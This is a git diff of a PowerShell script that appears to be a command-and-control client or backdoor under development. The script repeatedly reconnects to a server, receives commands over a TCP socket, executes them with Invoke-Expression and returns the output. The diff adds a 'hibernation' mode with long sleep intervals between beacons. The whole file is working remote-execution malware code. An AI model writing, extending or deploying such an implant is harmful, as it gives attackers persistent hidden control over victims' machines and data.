@@ -1,10 +1,12 @@
-# Define the server IP and port to connect to
+# Config
 $serverIP = "127.0.0.1"
 $serverPort = 1234
-
-# Config
 $sleeptime = 60
+$hibernationTime = 3600
+$mode = 0 # 0 = normal, 1 = Hibernation
 
+
+# Function allowing to connect to the server
 function Connect-ToServer {
     while ($true) {
         try {
@@ -13,23 +15,52 @@ function Connect-ToServer {
             $global:networkStream = $client.GetStream()
             $global:reader = [System.IO.StreamReader]::new($networkStream)
             $global:writer = [System.IO.StreamWriter]::new($networkStream)
-            Write-Host "Connected to server!"
+            Write-Host "Connected to server $serverIP on port $serverPort"
             return
-        } catch {
-            Write-Host "Failed to connect to server. Retrying in $sleeptime seconds..."
-            Start-Sleep -Seconds $sleeptime
+        }
+        catch {
+            if ($mode -eq 1) {
+                Write-Host "Entering hibernation mode... Retrying in $hibernationTime seconds..."
+                Start-Sleep -Seconds $hibernationTime
+            } else {
+                Write-Host "Failed to connect to server. Retrying in $sleeptime seconds..."
+                Start-Sleep -Seconds $sleeptime
+            }
         }
     }
 }
 
-# Function to test connection to server
+# Function to test connection to the server to update clinet.connected status
+# As per Microsoft documentation, the Connected property is not updated until you call the GetStream method
+# https://learn.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.connected?view=net-8.0
+
 function Test-Connection {
     try {
-        $writer.WriteLine("ping")
+        $message = Format-Message -message "ping"
+        $writer.WriteLine($message)
         $writer.Flush()
-    } catch {
-        
     }
+    catch {
+        Write-Host "An error occurred: $($_.Exception.Message)"
+    }
+}
+
+# Format message
+function Format-Message {
+    param (
+        [string]$message
+    )
+    
+    # Convert the string to a PowerShell object
+    $messageObject = [PSCustomObject]@{ message = $message }
+
+    # Add the 'mode' property
+    $messageObject | Add-Member -MemberType NoteProperty -Name mode -Value $mode
+
+    # Convert the object to JSON
+    $json = $messageObject | ConvertTo-Json
+    
+    return $json
 }
 
 # Function to handle incoming commands
@@ -39,13 +70,21 @@ function Handle-Commands {
         if ($client.Connected) {
             if ($networkStream.DataAvailable) {
                 $command = $reader.ReadLine()
-                $output = Invoke-Expression $command | ConvertTo-Json
-                $writer.WriteLine($output)
+                $output = Invoke-Expression $command
+                $formatted = Format-Message -message $output
+                $writer.WriteLine($formatted)
                 $writer.Flush()
                 $client.Close()
             }
-            Start-Sleep -Seconds $sleeptime
-        } else {
+            if ($mode -eq 1) {
+                Write-Host "Entering hibernation mode... Retrying in $hibernationTime seconds..."
+                Start-Sleep -Seconds $hibernationTime
+            } else {
+                Write-Host "No data available. Retrying in $sleeptime seconds..."
+                Start-Sleep -Seconds $sleeptime
+            }
+        }
+        else {
             Write-Host "Disconnected from server. Attempting to reconnect..."
             Connect-ToServer
         }
